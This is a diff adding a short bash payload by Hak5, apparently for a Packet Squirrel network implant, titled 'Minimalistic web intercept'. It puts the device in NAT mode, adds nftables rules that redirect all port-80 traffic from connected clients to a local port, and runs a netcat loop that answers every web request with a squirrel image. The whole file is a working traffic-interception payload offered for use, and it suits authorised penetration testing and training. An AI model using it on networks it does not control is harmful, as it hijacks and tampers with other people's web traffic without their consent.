@@ -1,0 +1,30 @@
+#!/bin/bash
+
+# Title:        Minimalistic web intercept
+# Description:  Replace HTTP with Squirrels.
+# Author:       Hak5
+# 
+# squirrel.jpg from Wikipedia
+# https://upload.wikimedia.org/wikipedia/commons/6/68/Sciuridae.jpg
+# By Chicoutimi (montage)KarakalAndiWNational Park Serviceen
+# User:Markus KrötzschThe Lilac Breasted RollerNico Conradie from Centurion, 
+# South AfricaHans HillewaertSylvouilleNational Park Service - Own work, CC BY 3.0, 
+# https://commons.wikimedia.org/w/index.php?curid=10213698
+
+NETMODE NAT
+LED B SOLID
+
+# Add a web payload to the nftables
+nft add table ip webpayload
+
+# Hook prerouting
+nft -- add chain ip webpayload prerouting { type nat hook prerouting priority -100 \; }
+
+# Redirect port 80 to our local 8080
+nft add rule ip webpayload prerouting tcp dport 80 redirect to :8080
+
+while true;
+  do echo -e "HTTP/1.1 200 OK\nContent-Type: image/jpeg\n" | \
+    cat - /root/payloads/$(SWITCH)/squirrel.jpg | \
+    netcat -l -p 8080; 
+done
